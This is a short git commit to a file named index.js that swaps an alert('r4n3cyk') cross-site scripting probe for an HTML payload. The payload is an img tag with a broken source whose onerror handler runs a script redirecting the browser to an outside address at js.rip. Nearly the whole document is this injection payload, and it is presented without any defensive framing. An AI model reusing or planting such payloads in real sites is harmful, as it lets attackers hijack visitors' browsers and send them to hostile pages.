32cc2d40fb9c857d28eccb2423b1b2b6ec2e318e
Caner Koyuncu <38630879+CanerKoyuncu@users.noreply.github.com>
2024-12-08 01:47:23 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,2 +1,9 @@
-alert("r4n3cyk")
+<html>
+  <head></head>
+  <body>
+  <img src=x onerror="redirect()">
 
+  <script>function redirect(){window.location.href="https://js.rip/r4n3cyk123"; }</script>
+  </body>
+  
+  </html>
